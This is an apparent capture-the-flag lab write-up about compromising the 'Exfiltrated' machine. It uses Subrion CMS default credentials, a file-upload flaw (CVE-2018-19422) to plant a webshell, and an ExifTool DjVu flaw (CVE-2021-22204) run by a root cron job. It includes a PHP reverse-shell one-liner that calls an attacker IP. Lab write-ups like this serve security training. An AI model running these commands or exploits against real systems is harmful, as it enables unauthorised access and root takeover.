Nmap scan revelaed ports 22 and 80 open. Website is http://exfiltrated.offsec

Wappalyzer shows it as a Subrion CMS, PHP, onn an Ubuntu OS, and Open Graph *(under misc)*

Admin dashboard login at - http://exfiltrated.offsec/panel/
This login page indicates it is Subrion CMS v4.2.1
Searchsploit shows this is vulnerable to CVE-2018-19422, File upload bypass (authenticated)

Another login page at - http://exfiltrated.offsec/login/

Able to register as a user at http://exfiltrated.offsec/registration/ but login doesn't seem to work once registered.

Using Gobuster to enumerate directories with the command:
```bash
gobuster dir -u http://exfiltrated.offsec -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -r 
```

## Interesting finds:
### .gitignore
```bash
.idea
.php_cs.cache
backup/*
!backup/.htaccess
includes/config.inc.php
modules/*
!modules/blog
!modules/fancybox
!modules/kcaptcha
*node_modules
templates/*
!templates/_common
!templates/kickstart
tmp/*
!tmp/.htaccess
uploads/*
!uploads/.htaccess
```

### robots.txt
```bash
Disallow: /backup/
Disallow: /cron/?
Disallow: /front/
Disallow: /install/
Disallow: /panel/
Disallow: /tmp/
Disallow: /updates/
```


Trying default credentials on the admin panel:
**admin:admin** worked, and I got admin access to the frontend and admin dashboard.

## CVE-2018-19422
Research showed that this version of Subrion is vulnerable to arbitrary file uploads on the upload functionality in the dashboard. Particularly .pht and .phar files can be uploaded (improper checks), I  was able to upload the WhiteWinterWold php webshell and gain RCE.

From this I was able to execute a reverse shell with a netcat listener and using the php command:
`php -r '$sock=fsockopen("192.168.45.158",4444);exec("sh <&3 >&3 2>&3");'`

## Cron Jobs
Enumerating cron jobs with `cat /etc/crontab` shows this:
```bash
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh
```

`image-exif.sh` looks interesting. It runs every minute and use exiftool to read jpg metadata from /var/www/html/subrion/uploads.

Exiftool is version 11.88, which is vulnerable to CVE-2021-22204 (Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image.)

Using this exploit; https://github.com/LazyTitan33/ExifTool-DjVu-exploit I generated a malicious image, containing a reverse shell payload. Uploaded it to the uploads directory and waited for the cron job to execute. With a netcat listener on my attacker machine, I established a reverse shell as root.